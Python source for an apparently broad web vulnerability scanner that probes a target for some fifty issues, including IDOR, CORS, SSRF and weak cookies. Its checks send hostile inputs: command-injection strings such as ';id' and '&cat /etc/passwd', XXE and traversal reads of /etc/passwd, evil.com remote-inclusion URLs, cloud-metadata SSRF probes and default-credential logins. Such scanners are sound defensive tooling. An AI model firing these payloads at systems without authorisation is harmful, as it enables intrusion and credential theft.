import requests
from urllib.parse import urlparse, urljoin
import concurrent.futures
import os
import re
import time
from omnisci3nt.modules.dns_enumeration import check_mx_spoof
import ssl
import base64
import dns.resolver
import colorama
from colorama import Fore, Style
import threading

# Initialize colorama with autoreset
colorama.init(autoreset=True)

# Global lock for thread-safe logging
log_lock = threading.Lock()

# Color mapping for log prefixes
COLOR_MAP = {
    "[❌ ]": Fore.RED,
    "[!]": Fore.RED,
    "[⚠️ ]": Fore.YELLOW,
    "[✔ ]": Fore.GREEN,
    "[OK]": Fore.GREEN,
    "[*]": Fore.CYAN,
    "===": Fore.MAGENTA  # For section headers
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
}

def colorize(msg):
    """Apply color to log message based on prefix or content"""
    # Check for section headers first
    if msg.startswith("==="):
        return COLOR_MAP["==="] + msg + Style.RESET_ALL
    
    # Then check for prefixes
    for prefix, color in COLOR_MAP.items():
        if msg.startswith(prefix):
            return color + msg + Style.RESET_ALL
    
    # Check if message contains any colored prefix (for multi-line messages)
    for prefix, color in COLOR_MAP.items():
        if prefix in msg:
            parts = msg.split(prefix)
            return parts[0] + color + prefix + Style.RESET_ALL + "".join(parts[1:])
    
    return msg  # No coloring for regular messages

def log(msg):
    """Thread-safe logging with colors"""
    colored_msg = colorize(msg)
    with log_lock:
        # Print colored message to console
        print(colored_msg)
        # Write plain text to file (strip color codes if any)
        plain_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg)
        with open("scan_results.txt", "a", encoding="utf-8") as f:
            f.write(plain_msg + "\n")


def check_idor(base_url):
    log("[*] Checking for potential IDOR...")
    urls = [f"{base_url}/user/1", f"{base_url}/user/2"]
    responses = []

    for url in urls:
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200:
                responses.append((url, r.text.strip()))
        except:
            continue

    if len(responses) == 2 and responses[0][1] != responses[1][1]:
        log(f"[⚠️ ] Potential IDOR found: {responses[0][0]} and {responses[1][0]}")
    else:
        log("[✔ ] IDOR: No clear signs of user-specific data exposure.")

def check_sensitive_files(base_url):
    log("[*] Checking for Exposed Sensitive Files...")
    sensitive_files = [
        (".env", ["SECRET", "DB_", "PASSWORD"]),
        (".git/config", ["repository", "[core]"]),
        ("config.php", ["<?php", "define", "DB_"]),
        ("backup.zip", []),
    ]

    for path, signatures in sensitive_files:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200 and any(sig in r.text for sig in signatures):
                log(f"[❌ ] Sensitive content found: {url}")
            elif r.status_code == 200 and path.endswith(".zip") and len(r.content) > 100:
                log(f"[❌ ] Downloadable backup found: {url}")
        except:
            continue
    log("[✔ ] Sensitive file scan done.")

def check_xss(base_url):
    log("[*] Checking for Reflected XSS...")
    test_url = f"{base_url}/search?q=<script>alert(1)</script>"
    try:
        r = requests.get(test_url, headers=HEADERS, timeout=5)
        if "<script>alert(1)</script>" in r.text:
            log(f"[❌ ] Reflected XSS possible at: {test_url}")
        else:
            log("[✔ ] XSS: No reflection found.")
    except:
        pass

def check_open_redirect(base_url):
    log("[*] Checking for Open Redirect...")
    test_paths = [
        "/redirect?url=https://google.com",
        "/out?target=https://google.com",
    ]

    for path in test_paths:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, allow_redirects=False, timeout=5)
            if r.status_code in [301, 302] and "google.com" in r.headers.get("Location", ""):
                log(f"[⚠️ ] Possible Open Redirect at: {url}")
        except:
            continue
    log("[✔ ] Open Redirect scan done.")

def check_clickjacking(base_url):
    log("[*] Checking for Clickjacking protection...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        if 'X-Frame-Options' not in r.headers:
            log(f"[⚠️ ] Clickjacking possible: No X-Frame-Options header found at {base_url}")
        else:
            log("[✔ ] Clickjacking protection is present.")
    except:
        pass

def check_cors(base_url):
    log("[*] Checking for insecure CORS configuration...")
    try:
        r = requests.options(base_url, headers={**HEADERS, "Origin": "https://evil.com"}, timeout=5)
        if r.headers.get("Access-Control-Allow-Origin") == "*" or "evil.com" in r.headers.get("Access-Control-Allow-Origin", ""):
            log(f"[⚠️ ] CORS Misconfiguration: {base_url} allows requests from arbitrary origins.")
        else:
            log("[✔ ] CORS config looks safe.")
    except:
        pass

def check_host_header_injection(base_url):
    log("[*] Checking for Host Header Injection...")
    try:
        r = requests.get(base_url, headers={"Host": "evil.com", **HEADERS}, timeout=5)
        if "evil.com" in r.text:
            log(f"[⚠️ ] Potential Host Header Injection found at {base_url}")
        else:
            log("[✔ ] No signs of host header injection.")
    except:
        pass

def check_directory_listing(base_url):
    log("[*] Checking for Directory Listing...")
    common_dirs = ["/images/", "/uploads/", "/backup/", "/files/", "/static/", "/public/"]
    for d in common_dirs:
        url = urljoin(base_url, d)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if "Index of" in r.text and r.status_code == 200:
                log(f"[⚠️ ] Directory listing enabled at: {url}")
        except:
            continue
    log("[✔ ] Directory listing scan done.")

def check_http_methods(base_url):
    log("[*] Checking for Dangerous HTTP Methods...")
    try:
        r = requests.options(base_url, headers=HEADERS, timeout=5)
        allow = r.headers.get("Allow", "")
        dangerous = [m for m in ["PUT", "DELETE", "TRACE", "CONNECT"] if m in allow]
        if dangerous:
            log(f"[⚠️ ] Dangerous HTTP methods enabled: {', '.join(dangerous)} at {base_url}")
        else:
            log("[✔ ] No dangerous HTTP methods enabled.")
    except:
        log("[!] Could not check HTTP methods.")

def check_security_headers(base_url):
    log("[*] Checking for Security Headers...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        headers = r.headers
        missing = []
        required = [
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Referrer-Policy",
            "Permissions-Policy",
        ]
        for h in required:
            if h not in headers:
                missing.append(h)
        if missing:
            log(f"[⚠️ ] Missing security headers: {', '.join(missing)} at {base_url}")
        else:
            log("[✔ ] All important security headers present.")
    except:
        log("[!] Could not check security headers.")

def check_insecure_cookies(base_url):
    log("[*] Checking for Insecure Cookies...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        cookies = r.headers.get("Set-Cookie", "")
        if cookies:
            if "Secure" not in cookies or "HttpOnly" not in cookies or "SameSite" not in cookies:
                log(f"[⚠️ ] Insecure cookie attributes found: {cookies}")
            else:
                log("[✔ ] Cookies have secure attributes.")
        else:
            log("[✔ ] No cookies set.")
    except:
        log("[!] Could not check cookies.")

def check_path_traversal(base_url):
    log("[*] Checking for Path Traversal...")
    test_paths = ["/etc/passwd", "../etc/passwd", "..%2Fetc%2Fpasswd", "..\\..\\windows\\win.ini"]
    for p in test_paths:
        url = urljoin(base_url, p)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if "root:x:" in r.text or "[extensions]" in r.text:
                log(f"[⚠️ ] Path traversal possible at: {url}")
        except:
            continue
    log("[✔ ] Path traversal scan done.")

def check_outdated_software(base_url):
    log("[*] Checking for Outdated Software (basic)...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        server = r.headers.get("Server", "")
        powered_by = r.headers.get("X-Powered-By", "")
        findings = []
        if server:
            findings.append(f"Server: {server}")
        if powered_by:
            findings.append(f"X-Powered-By: {powered_by}")
        if findings:
            log(f"[⚠️ ] Software/version info exposed: {', '.join(findings)}")
        else:
            log("[✔ ] No obvious software version info exposed.")
    except:
        log("[!] Could not check for outdated software.")

def check_weak_ssl_tls(base_url):
    log("[*] Checking for Weak SSL/TLS...")
    try:
        parsed = urlparse(base_url)
        host = parsed.hostname
        port = parsed.port or 443
        context = ssl.create_default_context()
        with ssl.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    not_after = cert.get('notAfter')
                    log(f"[✔ ] SSL certificate valid. Expires: {not_after}")
                else:
                    log(f"[⚠️ ] No certificate found for {host}")
    except Exception as e:
        log(f"[⚠️ ] SSL/TLS issue: {e}")

def check_info_disclosure(base_url):
    log("[*] Checking for Information Disclosure...")
    error_keywords = ["Exception", "Traceback", "Warning", "Error", "Notice", "Fatal"]
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        for keyword in error_keywords:
            if keyword in r.text:
                log(f"[⚠️ ] Info disclosure: '{keyword}' found in response at {base_url}")
        log("[✔ ] Info disclosure scan done.")
    except:
        log("[!] Could not check for info disclosure.")

def check_spf_record(base_url):
    log("[*] Checking for SPF Record...")
    try:
        parsed = urlparse(base_url)
        domain = parsed.netloc or parsed.path
        answers = dns.resolver.resolve(domain, 'TXT')
        found = False
        for r in answers:
            txt = str(r)
            if 'v=spf1' in txt:
                log(f"[OK] SPF record found: {txt}")
                found = True
        if not found:
            log("[!] No SPF record found. Domain may be vulnerable to email spoofing.")
    except Exception as e:
        log(f"[!] Error checking SPF record: {e}")

def check_exposed_git(base_url):
    log("[*] Checking for Exposed .git Directory...")
    for path in ["/.git/HEAD", "/.git/config"]:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200 and ("ref: " in r.text or "repositoryformatversion" in r.text):
                log(f"[!] Exposed .git directory at: {url}")
        except:
            continue
    log("[OK] .git directory not exposed.")

def check_exposed_backups(base_url):
    log("[*] Checking for Exposed Backup/Database Files...")
    backup_files = [
        "/backup.zip", "/backup.tar.gz", "/db.sql", "/database.sql", "/website.zip", "/dump.sql", "/backup.bak"
    ]
    for path in backup_files:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200 and len(r.content) > 100:
                log(f"[!] Exposed backup/database file at: {url}")
        except:
            continue
    log("[OK] No exposed backup/database files found.")

def check_sensitive_robots(base_url):
    log("[*] Checking robots.txt for sensitive data...")
    url = urljoin(base_url, "/robots.txt")
    try:
        r = requests.get(url, headers=HEADERS, timeout=5)
        if r.status_code == 200:
            sensitive = []
            for line in r.text.splitlines():
                if any(x in line.lower() for x in ["admin", "backup", "db", "secret", "private", "config"]):
                    sensitive.append(line)
            if sensitive:
                log(f"[!] Sensitive entries in robots.txt: {', '.join(sensitive)}")
            else:
                log("[OK] No sensitive entries in robots.txt.")
        else:
            log("[OK] No robots.txt found.")
    except:
        log("[!] Could not check robots.txt.")

def check_weak_basic_auth(base_url):
    log("[*] Checking for Weak Basic Auth...")
    common_creds = [("admin", "admin"), ("admin", "password"), ("root", "root"), ("user", "user")]
    test_paths = ["/admin", "/login", "/wp-admin", "/phpmyadmin"]
    for path in test_paths:
        url = urljoin(base_url, path)
        for user, pwd in common_creds:
            creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            try:
                r = requests.get(url, headers={**HEADERS, "Authorization": f"Basic {creds}"}, timeout=5)
                if r.status_code == 200 and ("logout" in r.text.lower() or "dashboard" in r.text.lower()):
                    log(f"[!] Weak/default credentials accepted at: {url} ({user}/{pwd})")
            except:
                continue
    log("[OK] No weak basic auth detected.")

def check_exposed_api(base_url):
    log("[*] Checking for Exposed API Endpoints...")
    api_paths = ["/api/", "/graphql", "/v1/", "/v2/", "/rest/", "/api/v1/", "/api/v2/"]
    for path in api_paths:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200 and ("application/json" in r.headers.get("Content-Type", "") or "graphql" in r.text.lower()):
                log(f"[!] Exposed API endpoint at: {url}")
        except:
            continue
    log("[OK] No exposed API endpoints found.")

def check_subdomain_takeover(base_url):
    log("[*] Checking for Subdomain Takeover (stub)...")
    # Full implementation would require a list of subdomains and CNAME checks
    log("[OK] Subdomain takeover check requires subdomain enumeration.")

def check_ssrf(base_url):
    log("[*] Checking for SSRF (basic)...")
    test_params = ["url", "next", "redirect", "dest", "data"]
    ssrf_payloads = ["http://127.0.0.1", "http://169.254.169.254", "http://localhost"]
    for param in test_params:
        for payload in ssrf_payloads:
            url = f"{base_url}?{param}={payload}"
            try:
                r = requests.get(url, headers=HEADERS, timeout=5)
                if r.status_code == 200 and ("localhost" in r.text or "127.0.0.1" in r.text):
                    log(f"[!] Possible SSRF at: {url}")
            except:
                continue
    log("[OK] SSRF scan done.")

def check_xxe(base_url):
    log("[*] Checking for XXE (basic)...")
    xml_payload = """<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"""
    headers = {**HEADERS, "Content-Type": "application/xml"}
    try:
        r = requests.post(base_url, data=xml_payload, headers=headers, timeout=5)
        if "root:x:" in r.text:
            log(f"[!] XXE vulnerability detected at: {base_url}")
        else:
            log("[OK] No XXE detected.")
    except:
        log("[OK] No XXE detected.")

def check_sqli(base_url):
    log("[*] Checking for SQL Injection (basic)...")
    sqli_payloads = ["'", '"', "'--", '"--', "' or 1=1--", '" or 1=1--']
    for payload in sqli_payloads:
        url = f"{base_url}/?id={payload}"
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if any(e in r.text.lower() for e in ["sql syntax", "mysql", "syntax error", "unclosed quotation", "odbc", "pdo", "pg_query", "sqlite"]):
                log(f"[!] Possible SQL Injection at: {url}")
        except:
            continue
    log("[OK] SQLi scan done.")

def check_cmd_injection(base_url):
    log("[*] Checking for Command Injection...")
    cmd_payloads = [";id", "|whoami", "&cat /etc/passwd"]
    for payload in cmd_payloads:
        url = f"{base_url}/?cmd={payload}"
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if any(x in r.text for x in ["uid=", "gid=", "root:x:", "user:"]):
                log(f"[!] Possible Command Injection at: {url}")
        except:
            continue
    log("[OK] Command Injection scan done.")

def check_lfi(base_url):
    log("[*] Checking for Local File Inclusion (LFI)...")
    lfi_payloads = ["../../../../etc/passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..\\..\\..\\..\\windows\\win.ini"]
    for payload in lfi_payloads:
        url = f"{base_url}/?file={payload}"
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if "root:x:" in r.text or "[extensions]" in r.text:
                log(f"[!] LFI vulnerability at: {url}")
        except:
            continue
    log("[OK] LFI scan done.")

def check_rfi(base_url):
    log("[*] Checking for Remote File Inclusion (RFI)...")
    rfi_payloads = ["http://evil.com/shell.txt", "//evil.com/shell.txt"]
    for payload in rfi_payloads:
        url = f"{base_url}/?file={payload}"
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if "evil.com" in r.text:
                log(f"[!] RFI vulnerability at: {url}")
        except:
            continue
    log("[OK] RFI scan done.")

def check_session_fixation(base_url):
    log("[*] Checking for Session Fixation...")
    try:
        r = requests.get(base_url, headers={**HEADERS, "Cookie": "PHPSESSID=12345; sessionid=12345"}, timeout=5)
        if "12345" in r.headers.get("Set-Cookie", ""):
            log(f"[!] Session fixation possible at: {base_url}")
        else:
            log("[OK] No session fixation detected.")
    except:
        log("[OK] No session fixation detected.")

def check_weak_jwt(base_url):
    log("[*] Checking for Weak JWT/Token Handling...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        cookies = r.headers.get("Set-Cookie", "")
        if ".eyJ" in cookies or "jwt" in cookies.lower():
            if "none" in cookies.lower():
                log(f"[!] JWT token with 'none' algorithm detected at: {base_url}")
            else:
                log(f"[OK] JWT token detected in cookies at: {base_url}")
        else:
            log("[OK] No JWT token detected.")
    except:
        log("[OK] No JWT token detected.")

def check_csp_bypass(base_url):
    log("[*] Checking for Weak CSP...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        csp = r.headers.get("Content-Security-Policy", "")
        if not csp:
            log(f"[!] No CSP header at: {base_url}")
        elif "unsafe-inline" in csp or "unsafe-eval" in csp:
            log(f"[!] Weak CSP policy at: {base_url} ({csp})")
        else:
            log("[OK] CSP header present and appears strong.")
    except:
        log("[OK] Could not check CSP.")

def check_reflected_params(base_url):
    log("[*] Checking for Reflected Parameters...")
    test_val = "uniquereflect123"
    url = f"{base_url}/?test={test_val}"
    try:
        r = requests.get(url, headers=HEADERS, timeout=5)
        if test_val in r.text:
            log(f"[!] Reflected parameter found at: {url}")
        else:
            log("[OK] No reflected parameters found.")
    except:
        log("[OK] No reflected parameters found.")

def check_brute_force(base_url):
    log("[*] Checking for Brute Force Protection...")
    login_paths = ["/login", "/admin", "/wp-login.php"]
    for path in login_paths:
        url = urljoin(base_url, path)
        try:
            for i in range(5):
                r = requests.post(url, data={"username": "admin", "password": f"wrong{i}"}, headers=HEADERS, timeout=5)
            if r.status_code == 200 and ("too many attempts" in r.text.lower() or "rate limit" in r.text.lower() or "locked" in r.text.lower()):
                log(f"[OK] Brute force protection detected at: {url}")
            else:
                log(f"[!] No brute force protection detected at: {url}")
        except:
            continue
    log("[OK] Brute force scan done.")

def check_cors_advanced(base_url):
    log("[*] Checking for Advanced CORS Misconfiguration...")
    try:
        r = requests.options(base_url, headers={**HEADERS, "Origin": "https://evil.com", "Access-Control-Request-Method": "GET"}, timeout=5)
        if r.headers.get("Access-Control-Allow-Origin") == "*" and r.headers.get("Access-Control-Allow-Credentials") == "true":
            log(f"[!] CORS misconfiguration: allows credentials with wildcard origin at: {base_url}")
        else:
            log("[OK] No advanced CORS misconfiguration detected.")
    except:
        log("[OK] Could not check advanced CORS.")

def check_cache_poisoning(base_url):
    log("[*] Checking for Cache Poisoning...")
    try:
        r = requests.get(base_url, headers={**HEADERS, "X-Forwarded-Host": "evil.com"}, timeout=5)
        if "evil.com" in r.text:
            log(f"[!] Possible cache poisoning at: {base_url}")
        else:
            log("[OK] No cache poisoning detected.")
    except:
        log("[OK] Could not check cache poisoning.")

def check_deserialization(base_url):
    log("[*] Checking for Deserialization Vulnerabilities (basic)...")
    # This is a stub; real check would require endpoint knowledge
    log("[OK] Deserialization check requires endpoint knowledge.")

def check_http2_http3(base_url):
    log("[*] Checking for HTTP/2 & HTTP/3 support...")
    if httpx is None:
        log("[!] httpx not installed, skipping HTTP/2/3 check.")
        return
    try:
        with httpx.Client(http2=True) as client:
            r = client.get(base_url, timeout=5)
            if r.http_version == "HTTP/2":
                log("[OK] HTTP/2 supported.")
            else:
                log("[OK] HTTP/2 not supported.")
        with httpx.Client(http2=True, http3=True) as client:
            r = client.get(base_url, timeout=5)
            if hasattr(r, 'http_version') and r.http_version == "HTTP/3":
                log("[OK] HTTP/3 supported.")
            else:
                log("[OK] HTTP/3 not supported.")
    except Exception as e:
        log(f"[!] Error checking HTTP/2/3: {e}")

def check_websocket(base_url):
    log("[*] Checking for WebSocket endpoints...")
    ws_paths = ["/ws", "/socket", "/websocket", "/ws/", "/socket.io/"]
    for path in ws_paths:
        ws_url = base_url.replace("http://", "ws://").replace("https://", "wss://")
        ws_url = ws_url.rstrip("/") + path
        try:
            import websocket
            ws = websocket.create_connection(ws_url, timeout=3)
            ws.close()
            log(f"[!] WebSocket endpoint open: {ws_url}")
        except Exception:
            continue
    log("[OK] WebSocket scan done.")

def check_csrf(base_url):
    log("[*] Checking for CSRF token in forms...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        forms = re.findall(r'<form.*?</form>', r.text, re.DOTALL|re.IGNORECASE)
        found = False
        for form in forms:
            if re.search(r'name=["\']csrf', form, re.IGNORECASE) or re.search(r'name=["\']_token', form, re.IGNORECASE):
                found = True
        if found:
            log("[OK] CSRF token found in forms.")
        else:
            log("[!] No CSRF token found in forms.")
    except:
        log("[OK] Could not check CSRF.")

def check_js_secrets(base_url):
    log("[*] Checking for secrets in JavaScript files...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', r.text, re.IGNORECASE)
        for js in js_files:
            js_url = js if js.startswith("http") else urljoin(base_url, js)
            try:
                js_r = requests.get(js_url, headers=HEADERS, timeout=5)
                if re.search(r'(api[_-]?key|secret|password|token)["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{8,}', js_r.text, re.IGNORECASE):
                    log(f"[!] Possible secret found in JS: {js_url}")
            except:
                continue
        log("[OK] JS secret scan done.")
    except:
        log("[OK] Could not check JS secrets.")

def check_open_redirect_advanced(base_url):
    log("[*] Checking for advanced Open Redirect...")
    payloads = ["//evil.com", "\\evil.com", "%2F%2Fevil.com", "%5Cevil.com", "//google.com%2F%2Fevil.com"]
    test_paths = ["/redirect?url=", "/out?target="]
    for path in test_paths:
        for payload in payloads:
            url = urljoin(base_url, path + payload)
            try:
                r = requests.get(url, headers=HEADERS, allow_redirects=False, timeout=5)
                if r.status_code in [301, 302] and ("evil.com" in r.headers.get("Location", "") or "google.com" in r.headers.get("Location", "")):
                    log(f"[!] Advanced open redirect at: {url}")
            except:
                continue
    log("[OK] Advanced open redirect scan done.")

def check_host_header_advanced(base_url):
    log("[*] Checking for advanced Host Header attacks...")
    try:
        r = requests.get(base_url, headers={**HEADERS, "Host": "evil.com"}, timeout=5)
        if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
            log(f"[!] Host header reflected or used in redirect at: {base_url}")
        else:
            log("[OK] No advanced host header issue detected.")
    except:
        log("[OK] Could not check advanced host header.")

def check_hpp(base_url):
    log("[*] Checking for HTTP Parameter Pollution...")
    url = f"{base_url}/?id=1&id=2"
    try:
        r = requests.get(url, headers=HEADERS, timeout=5)
        if "1,2" in r.text or "2,1" in r.text:
            log(f"[!] Possible HPP at: {url}")
        else:
            log("[OK] No HPP detected.")
    except:
        log("[OK] Could not check HPP.")

def check_file_upload(base_url):
    log("[*] Checking for file upload vulnerabilities (basic)...")
    upload_paths = ["/upload", "/fileupload", "/upload.php", "/admin/upload"]
    for path in upload_paths:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200 and ("type=\"file\"" in r.text or "enctype=\"multipart/form-data\"" in r.text):
                log(f"[!] Possible file upload form at: {url}")
        except:
            continue
    log("[OK] File upload scan done.")

def check_rate_limiting(base_url):
    log("[*] Checking for rate limiting on sensitive endpoints...")
    login_paths = ["/login", "/admin", "/wp-login.php"]
    for path in login_paths:
        url = urljoin(base_url, path)
        try:
            for i in range(10):
                r = requests.post(url, data={"username": "admin", "password": f"wrong{i}"}, headers=HEADERS, timeout=5)
            if r.status_code == 429 or "too many attempts" in r.text.lower() or "rate limit" in r.text.lower():
                log(f"[OK] Rate limiting detected at: {url}")
            else:
                log(f"[!] No rate limiting detected at: {url}")
        except:
            continue
    log("[OK] Rate limiting scan done.")

def check_response_splitting(base_url):
    log("[*] Checking for HTTP Response Splitting...")
    url = f"{base_url}/?q=foo%0d%0aSet-Cookie:%20evil=1"
    try:
        r = requests.get(url, headers=HEADERS, timeout=5)
        if "evil=1" in r.headers.get("Set-Cookie", ""):
            log(f"[!] HTTP response splitting at: {url}")
        else:
            log("[OK] No response splitting detected.")
    except:
        log("[OK] Could not check response splitting.")

def check_cloud_metadata(base_url):
    log("[*] Checking for cloud metadata exposure (via SSRF)...")
    # Already partially covered in SSRF, but can be more specific
    test_params = ["url", "next", "redirect", "dest", "data"]
    meta_urls = ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "http://169.254.169.254/metadata/instance"]
    for param in test_params:
        for payload in meta_urls:
            url = f"{base_url}?{param}={payload}"
            try:
                r = requests.get(url, headers=HEADERS, timeout=5)
                if "ami-id" in r.text or "instance-id" in r.text or "google" in r.text:
                    log(f"[!] Cloud metadata exposure at: {url}")
            except:
                continue
    log("[OK] Cloud metadata scan done.")

def check_well_known(base_url):
    log("[*] Checking for .well-known/security.txt and related files...")
    well_known_paths = ["/.well-known/security.txt", "/.well-known/change-password", "/.well-known/assetlinks.json"]
    for path in well_known_paths:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                log(f"[!] Exposed .well-known file at: {url}")
        except:
            continue
    log("[OK] .well-known scan done.")

def check_hsts_preload(base_url):
    log("[*] Checking for HSTS preload...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        hsts = r.headers.get("Strict-Transport-Security", "")
        if "preload" in hsts:
            log("[OK] HSTS preload directive present.")
        else:
            log("[!] HSTS preload directive missing.")
    except:
        log("[OK] Could not check HSTS preload.")

def check_third_party_leaks(base_url):
    log("[*] Checking for third-party service leaks...")
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        if re.search(r's3\.amazonaws\.com|github\.com|analytics|googletagmanager|firebaseio', r.text, re.IGNORECASE):
            log(f"[!] Possible third-party service leak in page content at: {base_url}")
        else:
            log("[OK] No obvious third-party service leaks.")
    except:
        log("[OK] Could not check third-party leaks.")

def run_all_checks(base_url):
    checks = [
        check_idor,
        check_sensitive_files,
        check_xss,
        check_open_redirect,
        check_clickjacking,
        check_cors,
        check_host_header_injection,
        check_directory_listing,
        check_http_methods,
        check_security_headers,
        check_insecure_cookies,
        check_path_traversal,
        check_outdated_software,
        check_weak_ssl_tls,
        check_info_disclosure,
        check_spf_record,
        check_exposed_git,
        check_exposed_backups,
        check_sensitive_robots,
        check_weak_basic_auth,
        check_exposed_api,
        check_subdomain_takeover,
        check_ssrf,
        check_xxe,
        check_sqli,
        check_cmd_injection,
        check_lfi,
        check_rfi,
        check_session_fixation,
        check_weak_jwt,
        check_csp_bypass,
        check_reflected_params,
        check_brute_force,
        check_cors_advanced,
        check_cache_poisoning,
        check_deserialization,
        check_http2_http3,
        check_websocket,
        check_csrf,
        check_js_secrets,
        check_open_redirect_advanced,
        check_host_header_advanced,
        check_hpp,
        check_file_upload,
        check_rate_limiting,
        check_response_splitting,
        check_cloud_metadata,
        check_well_known,
        check_hsts_preload,
        check_third_party_leaks,
    ]
    results = []
    def capture_log(msg):
        print(msg)
        results.append(msg)
    # Patch log function locally
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check, base_url) for check in checks]
        concurrent.futures.wait(futures)
    
    parsed = urlparse(base_url)
    domain = parsed.netloc or parsed.path
    check_mx_spoof(domain)

def run_vuln_scanner(base_url):
    if not base_url.startswith("http"):
        base_url = f"http://{base_url}"
    parsed = urlparse(base_url)
    domain = parsed.netloc or parsed.path

    timestamp = time.strftime("%Y%m%d-%H%M%S")
    outfile = "scan_results.txt"

    if os.path.exists(outfile):
        os.remove(outfile)

    log(Fore.MAGENTA + "\n=== Vulnerability Scan Started ===" + Style.RESET_ALL)
    log(f"{Fore.CYAN}Target:{Style.RESET_ALL} {domain}")
    log(f"{Fore.CYAN}Time:{Style.RESET_ALL} {timestamp}\n")

    run_all_checks(base_url)

    log(Fore.MAGENTA + "\n=== Scan Complete ===\n" + Style.RESET_ALL)
